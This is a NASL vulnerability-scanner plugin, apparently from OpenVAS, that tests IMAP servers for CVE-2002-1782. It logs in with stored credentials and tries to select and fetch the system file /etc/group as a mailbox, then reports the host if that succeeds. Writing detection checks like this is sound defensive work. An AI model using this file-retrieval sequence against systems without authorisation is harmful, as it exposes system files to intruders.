if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.12254" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "2.1" );
	script_tag( name: "cvss_base_vector", value: "AV:L/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2002-1782" );
	script_bugtraq_id( 4909 );
	script_name( "IMAP arbitrary file retrieval" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Remote file access" );
	script_dependencies( "imap4_banner.sc", "logins.sc" );
	script_require_ports( "Services/imap", 143 );
	script_mandatory_keys( "imap/banner/available", "imap/login", "imap/password" );
	script_xref( name: "URL", value: "http://www.washington.edu/imap/IMAP-FAQs/index.html#5.1" );
	script_tag( name: "solution", value: "Contact your vendor for a fix." );
	script_tag( name: "summary", value: "The target is running an IMAP daemon that allows an authenticated user
  to retrieve and manipulate files that would be available to that user via a shell. If IMAP users are denied
  shell access, you may consider this a vulnerability." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("imap_func.inc.sc");
kb_creds = imap_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if(!user || !pass){
	exit( 0 );
}
file = "/etc/group";
port = imap_get_port( default: 143 );
tag = 0;
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = recv_line( socket: soc, length: 1024 );
if(!strlen( s )){
	close( soc );
	exit( 0 );
}
s = chomp( s );
++tag;
c = NASLString( "a", NASLString( tag ), " AUTHENTICATE \"PLAIN\"" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
s = recv_line( socket: soc, length: 1024 );
s = chomp( s );
if(IsMatchRegexp( s, "^\\+" )){
	c = base64( str: raw_string( 0, user, 0, pass ) );
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024, timeout: 1 );){
		s = chomp( s );
		m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
		resp = "";
	}
}
if(isnull( resp )){
	++tag;
	c = NASLString( "a", NASLString( tag ), " LOGIN ", user, " ", pass );
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024 );){
		s = chomp( s );
		m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
		resp = "";
	}
}
if(resp && IsMatchRegexp( resp, "OK" )){
	++tag;
	c = NASLString( "a", NASLString( tag ), " SELECT \"", file, "\"" );
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024 );){
		s = chomp( s );
		m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
		resp = "";
	}
	if(resp && IsMatchRegexp( resp, "OK" )){
		++tag;
		c = NASLString( "a", NASLString( tag ), " FETCH 1 rfc822" );
		send( socket: soc, data: NASLString( c, "\\r\\n" ) );
		for(;s = recv_line( socket: soc, length: 1024 );){
			s = chomp( s );
			m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
			if(!isnull( m )){
				resp = m[1];
				break;
			}
			resp = "";
		}
		if(resp && IsMatchRegexp( resp, "OK" )){
			security_message( port );
		}
	}
}
++tag;
c = NASLString( "a", NASLString( tag ), " LOGOUT" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
	resp = "";
}
close( soc );

